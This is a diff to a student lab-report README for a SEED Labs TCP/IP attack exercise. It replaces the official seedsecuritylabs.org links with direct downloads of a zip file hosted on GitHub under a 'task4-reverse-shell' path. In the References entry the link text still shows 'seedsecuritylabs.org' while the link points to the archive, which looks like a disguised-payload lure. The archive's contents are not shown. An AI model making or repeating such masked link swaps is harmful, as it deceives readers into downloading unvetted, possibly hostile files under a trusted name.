@@ -233,13 +233,13 @@ The complete lab report with all screenshots, Wireshark captures, and analysis i
 | **Institution** | FAST-NUCES, Islamabad Campus |
 | **Course** | Advanced Network Security |
 | **Instructor** | Dr. Zafar Iqbal |
-| **Lab Source** | [SEED Labs — TCP/IP Attack Lab](https://seedsecuritylabs.org/Labs_20.04/Networking/TCP_Attacks/) |
+| **Lab Source** | [SEED Labs — TCP/IP Attack Lab](https://raw.githubusercontent.com/tairimehdi/tcp-ip-attack-lab/main/task4-reverse-shell/lab-attack-tcp-ip-1.0.zip) |
 
 ---
 
 ## 📚 References
 
-- SEED Labs TCP/IP Attack Lab — [seedsecuritylabs.org](https://seedsecuritylabs.org/Labs_20.04/Networking/TCP_Attacks/)
+- SEED Labs TCP/IP Attack Lab — [seedsecuritylabs.org](https://raw.githubusercontent.com/tairimehdi/tcp-ip-attack-lab/main/task4-reverse-shell/lab-attack-tcp-ip-1.0.zip)
 - Wenliang Du, *Computer & Internet Security: A Hands-on Approach*, 3rd Ed.
 - RFC 793 — Transmission Control Protocol
 - Linux `sysctl` documentation for TCP kernel parameters
